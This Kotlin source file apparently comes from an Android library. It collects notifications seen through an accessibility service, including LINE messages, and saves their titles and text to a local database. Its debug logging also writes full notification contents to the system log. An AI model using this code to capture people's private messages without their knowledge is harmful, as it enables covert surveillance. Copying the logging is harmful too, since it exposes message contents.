package com.hawkshaw.library.features.accessibility

import android.app.Notification
import android.util.Log // Added for Android logging
import androidx.core.app.NotificationCompat
import com.hawkshaw.library.datalayer.models.PackageName
import com.hawkshaw.library.datalayer.room.AppDatabase
import com.hawkshaw.library.datalayer.room.notification.NotificationEntity
import com.hawkshaw.library.App
import com.hawkshaw.library.logger.Logger
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

/**
 * Utility object for handling notifications captured by the accessibility service
 */
object NotificationKt {
    private const val TAG = "NotificationKt" // Existing TAG
    private val executor: ExecutorService = Executors.newSingleThreadExecutor()
    private var lastTimestamp: Long = 0
    private val db: AppDatabase by lazy { AppDatabase.getInstance(App.getContext()) }

    /**
     * Process and store notification data
     *
     * @param notification The notification to process
     * @param packageName The package that posted the notification
     */
    private fun handleNotification(notification: Notification, packageName: CharSequence) {
        Log.d(TAG, "[DEBUG] handleNotification called. PackageName: '$packageName', Notification.when: ${notification.`when`}, Extras: ${notification.extras}")
        try {
            val packageNameObj = PackageName.from(packageName)
            val timestamp = notification.`when`
            val extras = notification.extras

            Log.d(TAG, "[DEBUG] handleNotification: Parsed PackageName: $packageNameObj, Timestamp: $timestamp")

            // De-duplicate notifications with the same timestamp
            // With LINE app, allow notifications within 200ms to be processed separately
            Log.d(TAG, "[DEBUG] handleNotification: Deduplication check. Current timestamp: $timestamp, lastTimestamp: $lastTimestamp, packageNameObj: $packageNameObj")
            if (timestamp != lastTimestamp) {
                if (packageNameObj != PackageName.LINE || timestamp >= lastTimestamp + 200) {
                    Log.d(TAG, "[DEBUG] handleNotification: Proceeding with notification processing.")
                    lastTimestamp = timestamp
                    
                    // Extract notification content
                    val title = extras.getString(NotificationCompat.EXTRA_TITLE)
                    val text = extras.getString(NotificationCompat.EXTRA_TEXT)
                        ?: extras.getString(NotificationCompat.EXTRA_BIG_TEXT)
                        ?: extras.getStringArray(NotificationCompat.EXTRA_TEXT_LINES)?.joinToString("\n")
                        ?: notification.tickerText?.toString()
                    
                    Log.d(TAG, "[DEBUG] handleNotification: Extracted Title: '$title', Text: '$text'")

                    // Create and insert notification entity
                    if (text != null) {
                        val entity = NotificationEntity(
                            packageName = packageName.toString(),
                            title = title,
                            text = text,
                            timestamp = timestamp
                        )
                        Log.d(TAG, "[DEBUG] handleNotification: Creating NotificationEntity: $entity")
                        db.notificationDao().insertSync(entity)
                        // Logger.d is good for this success message.
                        Logger.d(TAG, "Saved notification: $packageName - $title",
                            false, 4, null)
                    } else {
                        Log.d(TAG, "[DEBUG] handleNotification: Notification text is null. Skipping save.")
                    }
                } else {
                    Log.d(TAG, "[DEBUG] handleNotification: Skipped LINE notification within 200ms of last. Timestamp: $timestamp, lastTimestamp: $lastTimestamp")
                }
            } else {
                Log.d(TAG, "[DEBUG] handleNotification: Skipped notification with same timestamp. Timestamp: $timestamp, lastTimestamp: $lastTimestamp")
            }
        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] Error in handleNotification: ${e.message}", e) // Also log to android.util.Log
            Logger.e(TAG, "Error handling notification", e, false, 12, null)
        }
    }

    /**
     * Public method to handle notifications asynchronously
     *
     * @param notification The notification to process
     * @param packageName The package that posted the notification
     */
    fun handleNotificationAsync(notification: Notification, packageName: CharSequence) {
        Log.d(TAG, "[DEBUG] handleNotificationAsync called. PackageName: '$packageName', Notification: $notification")
        executor.execute {
            handleNotification(notification, packageName)
        }
    }
}
